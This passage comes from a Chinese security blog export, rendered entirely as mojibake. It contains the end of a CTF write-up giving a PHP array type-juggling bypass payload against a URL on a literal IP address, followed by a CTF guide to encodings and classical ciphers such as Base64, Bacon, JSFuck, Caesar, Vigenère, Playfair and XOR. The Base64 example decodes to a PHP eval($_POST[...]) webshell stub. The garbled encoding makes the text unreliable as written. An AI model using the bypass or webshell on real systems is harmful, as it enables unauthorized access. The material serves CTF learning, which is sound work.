æœ€åè¾“å‡ºflagæ ¹æ®å¯¹æºç åˆ†æï¼Œæ„é€ å¦‚ä¸‹payloadï¼š http://139.129.166.67/5677ui8ifgs/index.php?myid=anyun&amp;name[]=1 postï¼špassword[]=2è¿™æ ·å°±ç»•è¿‡äº†ï¼Œå…·ä½“çš„åŸå› å°±ä¸ä¸€ä¸€è§£é‡Šäº†ã€‚ æ€»ç»“ä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜ï¼Œå¼±ç±»å‹ç¡®å®ç»™ç¨‹åºå‘˜ä¹¦å†™ä»£ç å¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œä½†æ˜¯ä¹Ÿè®©ç¨‹åºå‘˜å¿˜è®°äº†$array =array();çš„ä¹ æƒ¯ã€‚éƒ½è¯´ä¸€åˆ‡è¾“å…¥éƒ½æ˜¯æœ‰å®³çš„ é‚£ä¹ˆå…¶å®å¯ä»¥è¯´ä¸€åˆ‡è¾“å…¥çš„ç±»å‹ä¹Ÿæ˜¯å¯ç–‘çš„ï¼Œæ°¸è¿œä¸è¦ç›¸ä¿¡å¼±ç±»å‹çš„phpä¸‹ä»»ä½•æ¯”è¾ƒå‡½æ•°ï¼Œä»»ä½•æ•°å­¦è¿ç®—ã€‚å¦åˆ™ï¼Œä½ ç»å¯¹æ˜¯è¢«phpå‡ºå–çš„é‚£ä¸€ä¸ªã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFä¹‹åŠ è§£å¯†æ€»ç»“]]></title>
    <url>%2F2016%2F05%2F25%2FCTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[CTFæ¯”èµ›ä¸­ä¸»è¦åˆ†ä¸ºé€†å‘ç ´è§£ï¼ŒWebå®‰å…¨ï¼ŒåŠ å¯†è§£å¯†ï¼ŒPWNç­‰å‡ å¤§ç±»ï¼Œæœ¬æ–‡ä¸»è¦æ€»ç»“ä¸€äº›è‡ªå·±åšè¿‡çš„ctfçš„ä»¥ä¸‹åŠ å¯†è§£å¯†çš„æ–¹æ³•å’Œå·¥å…·ç­‰ã€‚ 0x01 Base64Base64é¡¾åæ€ä¹‰å°±æ˜¯ç”¨64ä¸ªå¯æ˜¾ç¤ºå­—ç¬¦è¡¨ç¤ºæ‰€æœ‰çš„ASCå­—ç¬¦ï¼Œ64ä¹Ÿå°±æ˜¯6Bitsï¼Œè€ŒASCå­—ç¬¦ä¸€å…±æœ‰256ä¸ªï¼Œä¹Ÿå°±æ˜¯8Bitsã€‚Base64ç¼–ç è¦æ±‚æŠŠ3ä¸ª8ä½å­—èŠ‚ï¼ˆ38=24ï¼‰è½¬åŒ–ä¸º4ä¸ª6ä½çš„å­—èŠ‚ï¼ˆ46=24ï¼‰ï¼Œä¹‹ååœ¨6ä½çš„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œå½¢æˆ8ä½ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼ã€‚ å¦‚æœå‰©ä¸‹çš„å­—ç¬¦ä¸è¶³3ä¸ªå­—èŠ‚ï¼Œåˆ™ç”¨0å¡«å……ï¼Œè¾“å‡ºå­—ç¬¦ä½¿ç”¨â€™=â€™ï¼Œå› æ­¤ç¼–ç åè¾“å‡ºçš„æ–‡æœ¬æœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ªâ€™=â€™å†…å­˜1ä¸ªå­—ç¬¦å 8ä½ ä¾‹å¦‚è½¬å‰ï¼š s 1 3 å…ˆè½¬æˆasciiï¼šå¯¹åº” 115 49 51 2è¿›åˆ¶ï¼š 01110011 00110001 00110011 6ä¸ªä¸€ç»„ï¼ˆ4ç»„ï¼‰ 011100110011000100110011 ç„¶åæ‰æœ‰åé¢çš„ 011100 110011 000100 110011 ç„¶åè®¡ç®—æœºæ˜¯8ä½8ä½çš„å­˜æ•° 6ä¸å¤Ÿï¼Œè‡ªåŠ¨å°±è¡¥ä¸¤ä¸ªé«˜ä½0äº† æ‰€æœ‰æœ‰äº† é«˜ä½è¡¥0 ç§‘å­¦è®¡ç®—å™¨è¾“å…¥ 00011100 00110011 00000100 00110011 å¾—åˆ° 28 51 4 51 æŸ¥å¯¹ä¸‹ç…§è¡¨ c z E z å½¢å¼ ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY= Base64åœ¨çº¿ç¼–ç è§£ç åœ°å€0x02 Base32Base32å’ŒBase64ç›¸æ¯”åªæœ‰ä¸€ä¸ªåŒºåˆ«å°±æ˜¯ï¼Œç”¨32ä¸ªå­—ç¬¦è¡¨ç¤º256ä¸ªASCå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´5ä¸ªASCå­—ç¬¦ä¸€ç»„å¯ä»¥ç”Ÿæˆ8ä¸ªBaseå­—ç¬¦ã€‚ Base32åœ¨çº¿ç¼–ç è§£ç åœ°å€æ³¨ï¼šä»¥ä¸Šä¸¤ç§ç¼–ç éƒ½å¯ä»¥ä½¿ç”¨pythonçš„base64æ¨¡å—æ¥åŠ è§£å¯† 0x03 åŸ¹æ ¹å¯†ç åŸ¹æ ¹å¯†ç ï¼ŒåŸ¹æ ¹æ‰€ç”¨çš„å¯†ç æ˜¯ä¸€ç§æœ¬è´¨ä¸Šç”¨äºŒè¿›åˆ¶æ•°è®¾è®¡çš„ï¼Œæ²¡æœ‰ç”¨é€šå¸¸çš„0å’Œ1æ¥è¡¨ç¤ºï¼Œè€Œæ˜¯é‡‡ç”¨aå’Œbå¯†æ–‡å½¢å¼æ˜¯æ˜æ˜¾ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ã€‚å¦‚å¤§å†™å­—æ¯å’Œå°å†™å­—æ¯ï¼Œè‹±æ–‡å’Œæ•°å­—ï¼Œæ–œä½“å’Œæ­£ä½“ã€‚ ä¾‹å¦‚DEath IS JUST A PaRT oF lIFE,sOMeTHInG wE&apos;RE aLL dESTInED TO dO. æ˜¯å¤§å†™å°å†™ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ å¤§å†™ç”¨aè¡¨ç¤ºï¼Œå°å†™ç”¨bè¡¨ç¤º é€‰å–5ä¸ªä¸€ç»„ DEath aabbb ISJUS aaaaa TAPaR aaaba ToFlI ababa FEsOM aabaa eTHIn baaab GwERE abaaa aLLdE baaba STInE aaaba DTOdO aaab æŒ‰ç…§ä¸Šè¿°çš„å½¢å¼å»åœ¨è¡¨é‡Œæ‰¾å¯¹åº”å¾—æ˜æ–‡. ç¬¬ä¸€ç§æ–¹å¼ A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab ç¬¬äºŒç§æ–¹å¼ a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB åŸ¹æ ¹å¯†ç åœ¨çº¿è§£å¯†0x04 æ‘©æ–¯å¯†ç æ‘©å°”æ–¯ç”µç æ˜¯ä¸€ç§æ—©æœŸçš„æ•°å­—åŒ–é€šä¿¡å½¢å¼ï¼Œä½†æ˜¯å®ƒä¸åŒäºç°ä»£åªä½¿ç”¨é›¶å’Œä¸€ä¸¤ç§çŠ¶æ€çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå®ƒçš„ä»£ç åŒ…æ‹¬äº”ç§ï¼š ç‚¹ã€åˆ’ã€ç‚¹å’Œåˆ’ä¹‹é—´çš„åœé¡¿ã€æ¯ä¸ªå­—ç¬¦é—´çŸ­çš„åœé¡¿ï¼ˆåœ¨ç‚¹å’Œåˆ’ä¹‹é—´ï¼‰ã€æ¯ä¸ªè¯ä¹‹é—´ä¸­ç­‰çš„åœé¡¿ä»¥åŠå¥å­ä¹‹é—´é•¿çš„åœé¡¿ã€‚ å½¢å¦‚ï¼šâ€“ â€” .-. â€¦ . è§£å¯†å¯¹ç…§ä¸‹å›¾æ‘©æ–¯å¯†ç è¡¨: åœ¨çº¿æ‘©æ–¯å¯†ç è§£å¯†0x05 JsFuckJSFuck å¯ä»¥è®©ä½ åªç”¨ 6 ä¸ªå­—ç¬¦ !+ æ¥ç¼–å†™ JavaScript ç¨‹åºã€‚ å½¢å¼ï¼š [][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])+[[+!+[]]]][+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])() å…¶ä»–ä¸€äº›åŸºæœ¬çš„è¡¨è¾¾ï¼š false =&gt; ![] true =&gt; !![] undefined =&gt; [][[]] NaN =&gt; +[![]] 0 =&gt; +[] 1 =&gt; +!+[] 2 =&gt; !+[]+!+[] 10 =&gt; [+!+[]]+[+[]] Array =&gt; [] Number =&gt; +[] String =&gt; []+[] Boolean =&gt; ![] Function =&gt; [][&quot;filter&quot;] eval =&gt; [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )() window =&gt; [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)() å¯ä»¥ä½¿ç”¨firebugç›´æ¥è§£å¯†. JsFuckåœ¨çº¿è§£å¯†0x06 æ …æ å¯†ç æ‰€è°“æ …æ å¯†ç ï¼Œå°±æ˜¯æŠŠè¦åŠ å¯†çš„æ˜æ–‡åˆ†æˆNä¸ªä¸€ç»„ï¼Œç„¶åæŠŠæ¯ç»„çš„ç¬¬1ä¸ªå­—è¿èµ·æ¥ï¼Œå½¢æˆä¸€æ®µæ— è§„å¾‹çš„è¯ã€‚ ä¸è¿‡æ …æ å¯†ç æœ¬èº«æœ‰ä¸€ä¸ªæ½œè§„åˆ™ï¼Œå°±æ˜¯ç»„æˆæ …æ çš„å­—æ¯ä¸€èˆ¬ä¸ä¼šå¤ªå¤šã€‚ï¼ˆä¸€èˆ¬ä¸è¶…è¿‡30ä¸ªï¼Œä¹Ÿå°±æ˜¯ä¸€ã€ä¸¤å¥è¯ï¼‰ ä¾‹å¦‚æ˜æ–‡ï¼šTHERE IS A CIPHER å»æ‰ç©ºæ ¼åå˜ä¸ºï¼šTHEREISACIPHER ä¸¤ä¸ªä¸€ç»„ï¼Œå¾—åˆ°ï¼šTH ER EI SA CI PH ER å…ˆå–å‡ºç¬¬ä¸€ä¸ªå­—æ¯ï¼šTEESCPE å†å–å‡ºç¬¬äºŒä¸ªå­—æ¯ï¼šHRIAIHR è¿åœ¨ä¸€èµ·å°±æ˜¯ï¼šTEESCPEHRIAIHR è¿˜åŸä¸ºæ‰€éœ€å¯†ç ã€‚ è€Œè§£å¯†çš„æ—¶å€™ï¼Œæˆ‘ä»¬å…ˆæŠŠå¯†æ–‡ä»ä¸­é—´åˆ†å¼€ï¼Œå˜ä¸ºä¸¤è¡Œï¼š T E E S C P E H R I A I H R å†æŒ‰ä¸Šä¸‹ä¸Šä¸‹çš„é¡ºåºç»„åˆèµ·æ¥ï¼š THEREISACIPHER åˆ†å‡ºç©ºæ ¼ï¼Œå°±å¯ä»¥å¾—åˆ°åŸæ–‡äº†ï¼š THERE IS A CIPHER ä¾‹å¦‚å¯†æ–‡ï¼šNlEyQd{seft} N l E y Q d { s e f t } NEQ{etIydsf} pythonå®ç°æ …æ è§£å¯†ï¼šzhalan.py 0x07 å‡¯æ’’å¯†ç å®ƒçš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡æŠŠå­—æ¯ç§»åŠ¨ä¸€å®šçš„ä½æ•°æ¥å®ç°åŠ å¯†å’Œè§£å¯†ã€‚æ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚ ##ä¾‹å¦‚ å½“åç§»é‡æ˜¯3çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å­—æ¯Aå°†è¢«æ›¿æ¢æˆDï¼ŒBå˜æˆEï¼Œä»¥æ­¤ç±»æ¨Xå°†å˜æˆAï¼ŒYå˜æˆBï¼ŒZå˜æˆCã€‚ç”±æ­¤å¯è§ï¼Œä½æ•°å°±æ˜¯å‡¯æ’’å¯†ç åŠ å¯†å’Œè§£å¯†çš„å¯†é’¥ã€‚ è§£å¯†å‚ç…§å‡¯æ’’å¯†ç è¡¨ï¼š ä¸Šè¿°çš„å¯†æ–‡ï¼šNEQ{etIydsf} å‘ç°ç§»ä½11 CTF{tianshu} pythonå®ç°å‡¯æ’’è§£å¯†ï¼škaisa.py 0x08 ç»´å‰åˆ©äºšå¯†ç æºæ’’å¯†ç çš„åŸºç¡€ä¸Šæ‰©å±•çš„å¤šè¡¨å¯†ç . å®ä¾‹å¦‚æœä½ è¦å¯¹è‡ªå·±çš„ç”·ï¼ˆå¥³ï¼‰ç¥ç”¨ç»´å¯†ï¼ˆä¸æ˜¯ç»´å¤šåˆ©äºšçš„ç§˜å¯†ï¼‰è¡¨ç™½ï¼Œå…ˆå†™å¥½æ˜æ–‡ï¼šI LOVE YOU ç„¶åè‡ªå·±è®¾å®šä¸€ä¸ªå¯†é’¥ï¼Œæ¯”å¦‚ï¼šKISSã€‚ è¿™æ ·å¯†é’¥ä¸æ˜æ–‡å¯¹åº”å°±æ˜¯ K ISSK ISS I LOVE YOU å¯¹ç¬¬ä¸€ä¸ªå­—æ¯â€œIâ€åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼š å…ˆæ‰¾åˆ°æœ€å·¦ä¾§å¯†é’¥Kæ‰€åœ¨çš„ä¸€è¡Œå’Œæœ€ä¸Šæ–¹æ˜æ–‡Iæ‰€åœ¨åˆ—ï¼Œæ‰¾åˆ°ä»–ä»¬çš„ç›¸äº¤å­—æ¯Sï¼Œè¿™æ ·Iå°±è¢«åŠ å¯†æˆäº†Sã€‚ åŒç†ï¼Œè¿™å¥è¯é€šè¿‡æ¯ä¸€ä¸ªå¯¹åº”å¯†é’¥çš„åŠ å¯†åå°±å˜æˆå¦‚ä¸‹ å¯†é’¥ï¼šKISSKISS æ˜æ–‡ï¼šILOVEYOU å¯†æ–‡ï¼šSTGNOGGM ç»´å‰åˆ©äºšå¯†ç è¡¨ï¼š ç»´å‰åˆ©äºšåŠ è§£å¯†å·¥å…· 0x09 Unicodeç¼–ç Unicodeï¼ˆç»Ÿä¸€ç ã€ä¸‡å›½ç ã€å•ä¸€ç ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦é¢†åŸŸé‡Œçš„ä¸€é¡¹ä¸šç•Œæ ‡å‡†,åŒ…æ‹¬å­—ç¬¦é›†ã€ç¼–ç æ–¹æ¡ˆç­‰ã€‚ç›®å‰å¸¸ç”¨çš„æœ‰UTF-8ã€UTF-16ã€UTF-32ã€‚ å¯†æ–‡å½¢å¼ï¼š \u5927\u5bb6\u597d\uff01\u000d\u000a Unicodeåœ¨çº¿è§£å¯† 0x10 brainfuckç¼–ç Brainfuckæ˜¯ä¸€ç§æå°åŒ–çš„è®¡ç®—æœºè¯­è¨€ï¼Œå®ƒæ˜¯ç”±Urban MÃ¼lleråœ¨1993å¹´åˆ›å»ºçš„ã€‚ç”±äºfuckåœ¨è‹±è¯­ä¸­æ˜¯è„è¯ï¼Œè¿™ç§è¯­è¨€æœ‰æ—¶è¢«ç§°ä¸ºbrainfckæˆ–brainf*kï¼Œç”šè‡³è¢«ç®€ç§°ä¸ºBFã€‚å…±æœ‰å…«ä¸ªå­—ç¬¦ å­—ç¬¦å«ä¹‰ï¼š &gt; æŒ‡é’ˆåŠ ä¸€ &lt; æŒ‡é’ˆå‡ä¸€ + æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼åŠ ä¸€ - æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼å‡ä¸€ . è¾“å‡ºæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå†…å®¹ï¼ˆASCâ…¡ç ï¼‰ , è¾“å…¥å†…å®¹åˆ°æŒ‡é’ˆæŒ‡å‘çš„å•å…ƒï¼ˆASCâ…¡ç ï¼‰ [ å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå€¼ä¸ºé›¶ï¼Œå‘åè·³è½¬åˆ°å¯¹åº”çš„]æŒ‡ä»¤çš„æ¬¡ä¸€æŒ‡ä»¤å¤„ ] å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå€¼ä¸ä¸ºé›¶ï¼Œå‘å‰è·³è½¬åˆ°å¯¹åº”çš„[æŒ‡ä»¤çš„æ¬¡ä¸€æŒ‡ä»¤å¤„ å¯†æ–‡å½¢å¼:++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-] &gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++. &gt;.+++.------.--------.&gt;+.&gt;. è§£å¯†æ–¹æ³• ä½¿ç”¨brainfuckè§£é‡Šå™¨è§£å¯† bftools.exe Decode braincopter doge.jpg -o dogeout.png bftools.exe run dogeout.png Q1RGe0JyYWluZnVja18xc19TaW1wMWV9 CTF{Brainfuck_1s_Simp1e} brainfuckåœ¨çº¿è§£å¯† 0x11 Playfairç¼–ç Playfairå¯†ç å‡ºç°äº1854å¹´ï¼Œå®ƒä¾æ®ä¸€ä¸ª5*5çš„æ­£æ–¹å½¢ç»„æˆçš„å¯†ç è¡¨æ¥ç¼–å†™ï¼Œå¯†ç è¡¨é‡Œæ’åˆ—æœ‰25ä¸ªå­—æ¯ã€‚å¦‚æœä¸€ç§è¯­è¨€å­—æ¯è¶…è¿‡25ä¸ªï¼Œå¯ä»¥å»æ‰ä½¿ç”¨é¢‘ç‡æœ€å°‘çš„ä¸€ä¸ªã€‚å¦‚ï¼Œæ³•è¯­ä¸€èˆ¬å»æ‰wæˆ–kï¼Œå¾·è¯­åˆ™æ˜¯æŠŠiå’Œjåˆèµ·æ¥å½“æˆä¸€ä¸ªå­—æ¯çœ‹å¾…ã€‚è‹±è¯­ä¸­zä½¿ç”¨æœ€å°‘ï¼Œå¯ä»¥å»æ‰å®ƒã€‚ åŠ å¯†æè¿°ï¼šç¬¬ä¸€æ­¥æ˜¯ç¼–åˆ¶å¯†ç è¡¨ã€‚åœ¨è¿™ä¸ª5*5çš„å¯†ç è¡¨ä¸­ï¼Œå…±æœ‰5è¡Œ5åˆ—å­—æ¯ã€‚ ç¬¬ä¸€åˆ—ï¼ˆæˆ–ç¬¬ä¸€è¡Œï¼‰æ˜¯å¯†é’¥,å…¶ä½™æŒ‰ç…§å­—æ¯é¡ºåºã€‚å¯†é’¥æ˜¯ä¸€ä¸ªå•è¯æˆ–è¯ç»„ï¼Œè‹¥æœ‰é‡å¤å­—æ¯ï¼Œå¯å°†åé¢é‡å¤çš„å­—æ¯å»æ‰ã€‚å½“ç„¶ä¹Ÿè¦æŠŠä½¿ç”¨é¢‘ç‡æœ€å°‘çš„å­—æ¯å»æ‰ã€‚ å¦‚ï¼šå¯†é’¥æ˜¯Live and learn,å»æ‰ååˆ™ä¸ºliveandrã€‚å¦‚æœå¯†é’¥è¿‡é•¿å¯å ç”¨ç¬¬äºŒåˆ—æˆ–è¡Œ ä¾‹å¦‚é¦–å…ˆplayfairçš„åŠ å¯†è¿‡ç¨‹ç”¨åˆ°ä¸€ä¸ª5x5çš„å­—æ¯çŸ©é˜µ,å®¹çº³26ä¸ªå­—æ¯ï¼Œå…¶ä¸­iå’ŒjæŒ¤åˆ°ä¸€ä¸ªæ ¼å­é‡Œï¼Œå­—æ¯å¡«å†™é¡ºåºå– å†³äºå¯†é’¥ï¼ŒThe quick brown fox jumps over the lazy dog!æ—¢ç„¶å‡ºé¢˜è€…ä¸æ˜¯åœ¨è®²æ•…äº‹ï¼Œé‚£ï¼Œè¿™å¥å°±æ˜¯å¯†é’¥äº†å§ å°†ç©ºæ ¼å»æ‰ï¼Œç„¶åå¡«å…¥çŸ©é˜µé‡Œï¼Œé‡å¤å‡ºç°çš„å­—æ¯åªå¡«ä¸€æ¬¡ã€‚ å¡«å®Œåå¦‚ä¸‹è¡¨ï¼š t h e q u i/j c k b r o w n f x m p s v l a z y d g å¡«å®Œå¯†é’¥å‡ºç°çš„å­—æ¯åï¼Œè‹¥è¿˜æœ‰ç©ºä½™ï¼Œå°±å¡«å­—æ¯è¡¨ä¸­å‰©ä½™çš„å­—æ¯ï¼ˆæŒ‰å­—æ¯è¡¨é¡ºåºï¼‰ åŠ å¯†è¿‡ç¨‹ï¼šæŠŠæ˜æ–‡æŒ‰ä¸¤ä¸ªå­—æ¯ä¸€ç»„åˆ†ç»„ï¼Œæ¯”å¦‚helloå°±åˆ†æˆhe,lx,lo ç›¸é‚»å­—æ¯ç›¸åŒçš„æƒ…å†µä¸‹ï¼Œä¸­é—´åŠ ä¸ªå¡«å……å­—æ¯x(æœ‰æ—¶å€™æ˜¯q)ï¼Œè‹¥æœ€åä¸€ä¸ªå­—æ¯æ²¡ç»„å‘˜ï¼Œä¹ŸåŠ ä¸ªå¡«å……å­—æ¯ã€‚ åŠ å¯†è§„åˆ™ï¼š 1ã€ä¸¤æ˜æ–‡å­—æ¯m1,m2åŒè¡Œï¼Œå¯†æ–‡å­—æ¯c1,c2åœ¨å®ƒä»¬å³è¾¹ï¼ŒåŒè¡Œå¾ªç¯ï¼Œæ¯”å¦‚huåŠ å¯†åæ˜¯etï¼› 2ã€m1,m2åŒåˆ—ï¼šc1,c2åœ¨å®ƒä»¬ä¸‹è¾¹ï¼ŒåŒåˆ—å¾ªç¯ï¼ŒhzåŠ å¯†åæ˜¯chï¼› 3ã€m1,m2ä¸åŒè¡Œåˆ—ï¼šc1,c2æ˜¯m1,m2 ç»„æˆçš„é•¿æ–¹å½¢çš„å¦ä¸¤ä¸ªé¡¶ç‚¹ï¼Œé¡ºåºæ˜¯c1ä¸m1åŒè¡Œï¼Œc2ä¸m2åŒè¡Œï¼ŒcdåŠ å¯†åæ˜¯bzï¼› è§£å¯†è¿‡ç¨‹ï¼šæœ‰äº†å¯†é’¥çŸ©é˜µï¼Œå°†åŠ å¯†è¿‡ç¨‹åè¿‡æ¥å°±è¡Œã€‚ihxoè§£å¯†å°±æ˜¯ctfx ihxo{smzdodcikmodcismzd} ctfx{playfairisfairplay} 0x12 urlcodeç¼–ç UrlEncodeï¼šå°†å­—ç¬¦ä¸²ä»¥URLç¼–ç  è¿”å›å€¼ï¼šå­—ç¬¦ä¸² å‡½æ•°ç§ç±»ï¼šç¼–ç å¤„ç† å½¢å¼ï¼š%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d urlcodeåœ¨çº¿è§£å¯†0x13 Serpentç¼–ç Serpentï¼ˆèŸ’è›‡ï¼‰,å®ƒæ˜¯AESçš„ä¸€ä¸ªå€™é€‰ç®—æ³•,è¯¥ç®—æ³•ä½¿ç”¨256ä½çš„å¯†é’¥å¯¹128ä½çš„å†³æ•°æ®è¿›è¡ŒåŠ è§£å¯†;æè¿°äº†Serpentçš„åŠ è§£å¯†è¿‡ç¨‹åŠå­å¯†é’¥ç”Ÿæˆè¿‡ç¨‹,åŒæ—¶å¯¹å…¶æ€§èƒ½ä½œäº†éƒ¨åˆ†é˜è¿° Serpentåœ¨çº¿è§£å¯†0x14 å¼‚æˆ–åŠ å¯†å¼‚æˆ–çš„è¿ç®—æ–¹æ³•æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶è¿ç®—ï¼š 1^1=0 0^0=0 1^0=1 0^1=1 ä¸¤è€…ç›¸ç­‰ä¸º0,ä¸ç­‰ä¸º1. å½¢å¼ï¼š ä¸€èˆ¬ä¸ºä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²å’Œä¸€ä¸ªè‹±æ–‡å­—æ¯ è§£å¯†è¿‡ç¨‹ å…ˆæŠŠå¯†é’¥è½¬åŒ–æˆäºŒè¿›åˆ¶ å†å’Œå¯†æ–‡å¼‚æˆ– å¼‚æˆ–è§£å¯†ç®—æ³•ï¼šyihuo.py 0x15 CRC32åŠ å¯†CRCæ ¡éªŒå®ç”¨ç¨‹åºåº“ åœ¨æ•°æ®å­˜å‚¨å’Œæ•°æ®é€šè®¯é¢†åŸŸï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„æ­£ç¡®ï¼Œå°±ä¸å¾—ä¸é‡‡ç”¨æ£€é”™çš„æ‰‹æ®µã€‚åœ¨è¯¸å¤šæ£€é”™æ‰‹æ®µä¸­ï¼ŒCRCæ˜¯æœ€è‘—åçš„ä¸€ç§ã€‚CRCçš„å…¨ç§°æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒã€‚CRCæ˜¯ç½‘ç»œä¼ è¾“ä¸­ç»å¸¸ç”¨çš„ä¸€ç§æ ¡éªŒæ–¹å¼ã€‚å…¶ä¸­CRC32åˆ™æ˜¯é‡‡ç”¨è¿™æ ·çš„ä¸€ä¸ªå¤šé¡¹å¼ç”Ÿæˆå¼çš„CRCï¼šXe32+Xe26+Xe23+Xe22+Xe16+Xe12+Xe11+Xe10 +Xe8+Xe7+Xe5+Xe4+Xe2+X+1( string$str )ç”Ÿæˆstrçš„ 32 ä½å¾ªç¯å†—ä½™æ ¡éªŒç å¤šé¡¹å¼ã€‚è¿™é€šå¸¸ç”¨äºæ£€æŸ¥ä¼ è¾“çš„æ•°æ®æ˜¯å¦å®Œæ•´ã€‚ pythonè®¡ç®—CRC32 0x16 é‚®ä»¶ç¼–ç é‚®ä»¶ç¼–ç å³uuencodeç¼–ç ï¼Œæ˜¯å°†äºŒè¿›åˆ¶æ–‡ä»¶è½¬æ¢ä¸ºæ–‡æœ¬æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè½¬æ¢åçš„æ–‡ä»¶å¯ä»¥é€šè¿‡çº¯æ–‡æœ¬e-mailè¿›è¡Œä¼ 